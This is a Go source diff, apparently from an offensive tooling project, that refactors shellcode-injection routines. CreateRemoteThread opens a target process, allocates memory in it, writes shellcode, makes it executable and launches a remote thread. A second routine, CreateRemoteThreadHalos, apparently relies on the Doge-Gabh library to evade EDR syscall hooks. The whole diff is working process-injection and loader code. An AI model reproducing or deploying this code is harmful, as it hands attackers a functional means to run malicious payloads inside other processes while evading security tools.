@@ -4,27 +4,26 @@ import (
 	"errors"
 	"syscall"
 	"unsafe"
-	"variant/wdll"
+	"variant/xwindows"
 
 	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
-
 	"golang.org/x/sys/windows"
 )
 
 func CreateRemoteThread(shellcode []byte, pid int) error {
-	var pHandle uintptr
+	var pHandle windows.Handle
 
 	if pid == 0 {
-		pHandle, _, _ = wdll.GetCurrentProcess().Call()
+		pHandle, _ = xwindows.GetCurrentProcess()
 	} else {
-		pHandle, _, _ = wdll.OpenProcess().Call(
+		pHandle, _ = xwindows.OpenProcess(
 			windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
-			uintptr(0),
-			uintptr(pid),
+			false,
+			uint32(pid),
 		)
 	}
 
-	addr, _, _ := wdll.VirtualAllocEx().Call(
+	addr, _ := xwindows.VirtualAllocEx(
 		pHandle,
 		0,
 		uintptr(len(shellcode)),
@@ -36,29 +35,31 @@ func CreateRemoteThread(shellcode []byte, pid int) error {
 		return errors.New("VirtualAllocEx failed and returned 0")
 	}
 
-	_, _, err := wdll.WriteProcessMemory().Call(
+	var bytesWritten uintptr
+	errWP := xwindows.WriteProcessMemory(
 		pHandle,
 		addr,
-		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		&shellcode[0],
 		uintptr(len(shellcode)),
+		&bytesWritten,
 	)
-	if err != nil {
-		return err
+	if errWP != nil {
+		return errWP
 	}
 
-	oldProtect := windows.PAGE_READWRITE
-	_, _, err = wdll.VirtualProtectEx().Call(
+	var oldProtect uint32
+	errVP := xwindows.VirtualProtectEx(
 		pHandle,
 		addr,
 		uintptr(len(shellcode)),
 		windows.PAGE_EXECUTE_READ,
-		uintptr(unsafe.Pointer(&oldProtect)),
+		&oldProtect,
 	)
-	if err != nil {
-		return err
+	if errVP != nil {
+		return errVP
 	}
 
-	_, _, err = wdll.CreateRemoteThreadEx().Call(
+	_, errCR := xwindows.CreateRemoteThreadEx(
 		pHandle,
 		0,
 		0,
@@ -66,14 +67,14 @@ func CreateRemoteThread(shellcode []byte, pid int) error {
 		0,
 		0,
 		0,
+		0,
 	)
-	if err != nil {
-		return err
+	if errCR != nil {
+		return errCR
 	}
 
-	_, _, errCloseHandle := wdll.CloseHandle().Call(pHandle)
-	if errCloseHandle != nil {
-		return errCloseHandle
+	if errCH := xwindows.CloseHandle(pHandle); errCH != nil {
+		return errCH
 	}
 
 	return nil
@@ -160,7 +161,10 @@ func CreateRemoteThreadHalos(shellcode []byte) error {
 		0,
 	)
 
-	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	_, errWF := xwindows.WaitForSingleObject(windows.Handle(hhosthread), windows.INFINITE)
+	if errWF != nil {
+		return errWF
+	}
 
 	if r3 != 0 {
 		return err
